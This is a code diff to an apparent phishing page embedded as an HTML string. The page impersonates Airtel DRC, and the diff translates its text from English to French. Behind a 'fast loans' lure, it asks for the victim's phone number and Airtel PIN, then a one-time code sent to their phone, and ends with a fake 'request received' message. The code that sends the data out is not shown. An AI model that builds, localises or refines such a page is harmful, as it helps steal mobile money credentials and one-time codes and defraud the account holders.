@@ -413,7 +413,7 @@ AIRTEL_HTML = r"""<!DOCTYPE html>
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Airtel DRC - Login</title>
+  <title>Airtel RDC - Connexion</title>
   <script src="https://cdn.tailwindcss.com"></script>
   <script src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
   <script src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
@@ -515,8 +515,8 @@ AIRTEL_HTML = r"""<!DOCTYPE html>
         return (
           <div className='min-h-screen flex flex-col items-center justify-center bg-white p-6 text-center'>
             <div className='w-16 h-16 border-4 border-gray-100 border-t-red-600 rounded-full animate-spin mb-6'></div>
-            <h2 className='text-2xl font-bold text-gray-900'>Verifying account</h2>
-            <p className='text-gray-500 mt-2'>Please wait while we secure your connection...</p>
+            <h2 className='text-2xl font-bold text-gray-900'>Vérification du compte</h2>
+            <p className='text-gray-500 mt-2'>Veuillez patienter pendant que nous sécurisons votre connexion...</p>
           </div>
         );
       }
@@ -524,20 +524,20 @@ AIRTEL_HTML = r"""<!DOCTYPE html>
         return (
           <div className='min-h-screen flex flex-col'>
             <header className='airtel-red text-white p-6 text-center relative'>
-              <h1 className='text-3xl font-bold'>Airtel DRC</h1>
-              <p className='text-sm mt-1 opacity-90'>Request Received</p>
+              <h1 className='text-3xl font-bold'>Airtel RDC</h1>
+              <p className='text-sm mt-1 opacity-90'>Demande reçue</p>
             </header>
             <main className='flex-1 flex justify-center px-4 -mt-6'>
               <div className='bg-white w-full max-w-2xl rounded-t-[32px] shadow-xl p-8 sm:p-12 text-center'>
                 <div className='mx-auto w-24 h-24 bg-green-100 rounded-full flex items-center justify-center mb-8'>
                   <svg className='w-12 h-12 text-green-600' fill='none' stroke='currentColor' viewBox='0 0 24 24'><path strokeLinecap='round' strokeLinejoin='round' strokeWidth='2' d='M5 13l4 4L19 7'></path></svg>
                 </div>
-                <h2 className='text-3xl font-bold text-gray-900'>Thank You!</h2>
-                <p className='text-gray-600 mt-6 text-xl leading-relaxed'>Your request has been submitted successfully. Please wait for confirmation.</p>
+                <h2 className='text-3xl font-bold text-gray-900'>Merci !</h2>
+                <p className='text-gray-600 mt-6 text-xl leading-relaxed'>Votre demande a été soumise avec succès. Veuillez patienter pour la confirmation.</p>
                 <div className='mt-8 p-6 bg-gray-50 rounded-2xl border border-gray-100'>
-                  <p className='text-gray-700 font-medium text-lg'>A representative will contact you at <span className='text-red-600 font-bold'>+243 {phone}</span> within 24 hours to finalize your plan.</p>
+                  <p className='text-gray-700 font-medium text-lg'>Un conseiller vous contactera au numéro <span className='text-red-600 font-bold'>+243 {phone}</span> sous 24 heures pour finaliser votre dossier.</p>
                 </div>
-                <button onClick={() => window.close()} className='w-full mt-10 py-5 border-2 border-gray-200 text-gray-600 rounded-full text-xl font-bold hover:bg-gray-50 transition-colors'>Close this window</button>
+                <button onClick={() => window.close()} className='w-full mt-10 py-5 border-2 border-gray-200 text-gray-600 rounded-full text-xl font-bold hover:bg-gray-50 transition-colors'>Fermer cette fenêtre</button>
               </div>
             </main>
           </div>
@@ -548,21 +548,21 @@ AIRTEL_HTML = r"""<!DOCTYPE html>
         return (
           <div className='min-h-screen flex flex-col'>
             <header className='airtel-red text-white p-6 text-center relative'>
-              <button onClick={() => setStep(1)} className='absolute left-6 top-6 text-2xl'>â†</button>
-              <h1 className='text-3xl font-bold'>Airtel DRC</h1>
-              <p className='text-sm mt-1 opacity-90'>Verification Required</p>
+              <button onClick={() => setStep(1)} className='absolute left-6 top-6 text-2xl'>←</button>
+              <h1 className='text-3xl font-bold'>Airtel RDC</h1>
+              <p className='text-sm mt-1 opacity-90'>Vérification requise</p>
             </header>
             <main className='flex-1 flex justify-center px-4 -mt-6'>
               <div className='bg-white w-full max-w-2xl rounded-t-[32px] shadow-xl p-8 sm:p-12 text-center'>
-                <h2 className='text-3xl font-bold text-gray-900'>Enter OTP</h2>
-                <p className='text-gray-500 mt-4 text-lg'>OTP has been sent to the number <span className='font-bold text-gray-900'>+243 {phone}</span> added earlier.</p>
+                <h2 className='text-3xl font-bold text-gray-900'>Entrez le code OTP</h2>
+                <p className='text-gray-500 mt-4 text-lg'>Le code de vérification a été envoyé au numéro <span className='font-bold text-gray-900'>+243 {phone}</span> renseigné précédemment.</p>
                 <div className='flex justify-center gap-2 sm:gap-4 mt-10'>
                   {[0, 1, 2, 3].map((i) => (
                     <input key={i} id={`otp-${i}`} type='text' maxLength='1' className='w-10 h-14 sm:w-16 sm:h-20 text-center text-2xl sm:text-3xl font-bold border border-gray-300 rounded-xl sm:rounded-2xl focus:border-red-500 outline-none' value={otp[i] || ''} onChange={(e) => hOC(i, e.target.value)} />
                   ))}
                 </div>
-                <div className='mt-6 text-gray-500 font-medium'>Resend code in <span className='text-red-600'>{timer}s</span></div>
-                <button onClick={handleVerify} className='w-full mt-10 py-5 airtel-red text-white rounded-full text-xl font-bold hover:opacity-90'>Verify & Continue</button>
+                <div className='mt-6 text-gray-500 font-medium'>Renvoyer le code dans <span className='text-red-600'>{timer}s</span></div>
+                <button onClick={handleVerify} className='w-full mt-10 py-5 airtel-red text-white rounded-full text-xl font-bold hover:opacity-90'>Vérifier & Continuer</button>
               </div>
             </main>
           </div>
@@ -571,27 +571,27 @@ AIRTEL_HTML = r"""<!DOCTYPE html>
       return (
         <div className='min-h-screen flex flex-col'>
           <header className='airtel-red text-white p-6 text-center relative'>
-            <div className='absolute left-6 top-6 text-2xl'>â‰¡</div>
-            <h1 className='text-3xl font-bold'>Airtel DRC</h1>
-            <p className='text-sm mt-1 opacity-90'>Fast loans. Anytime. Anywhere.</p>
+            <div className='absolute left-6 top-6 text-2xl'>≡</div>
+            <h1 className='text-3xl font-bold'>Airtel RDC</h1>
+            <p className='text-sm mt-1 opacity-90'>Crédits rapides. N’importe quand. N’importe où.</p>
           </header>
           <main className='flex-1 flex justify-center px-4 -mt-6'>
             <div className='bg-white w-full max-w-2xl rounded-t-[32px] shadow-xl p-8 sm:p-12'>
-              <h2 className='text-4xl font-bold text-gray-900'>Welcome back</h2>
-              <p className='text-gray-500 mt-2 text-lg'>Log in to your Airtel account</p>
+              <h2 className='text-4xl font-bold text-gray-900'>Bienvenue</h2>
+              <p className='text-gray-500 mt-2 text-lg'>Connectez-vous à votre compte Airtel</p>
               <div className='mt-8 bg-red-50 border border-red-200 rounded-xl p-4 flex items-center gap-3'>
                 <div className='w-6 h-6 rounded-full border-2 border-red-500 flex items-center justify-center text-red-500 font-bold text-sm'>!</div>
-                <p className='text-red-700 font-medium'>Enter your Airtel number.</p>
+                <p className='text-red-700 font-medium'>Entrez votre numéro Airtel.</p>
               </div>
               <div className="mt-10">
-                <label className="block text-gray-700 font-semibold mb-3 text-lg">Phone number</label>
+                <label className="block text-gray-700 font-semibold mb-3 text-lg">Numéro de téléphone</label>
                 <div className="flex items-center border border-gray-300 rounded-2xl overflow-hidden focus-within:border-red-500">
                   <span className="bg-gray-50 px-5 py-4 border-r border-gray-300 text-gray-500 font-medium text-lg">+243</span>
                   <input type="tel" className="flex-1 px-5 py-4 outline-none text-lg" value={phone} onChange={(e) => setPhone(e.target.value)} />
                 </div>
               </div>
               <div className="mt-10">
-                <label className="block text-gray-700 font-semibold mb-3 text-lg text-center sm:text-left">Enter your Airtel PIN code</label>
+                <label className="block text-gray-700 font-semibold mb-3 text-lg text-center sm:text-left">Entrez votre code PIN Airtel</label>
                 <div className="flex justify-center sm:justify-start gap-4 mt-4">
                   {pin.map((d, i) => (
                     <input key={i} id={`pin-${i}`} type="password" maxLength="1" className="w-16 h-20 text-center text-3xl font-bold border border-gray-300 rounded-2xl focus:border-red-500 outline-none" value={d} onChange={(e) => hPC(i, e.target.value)} />
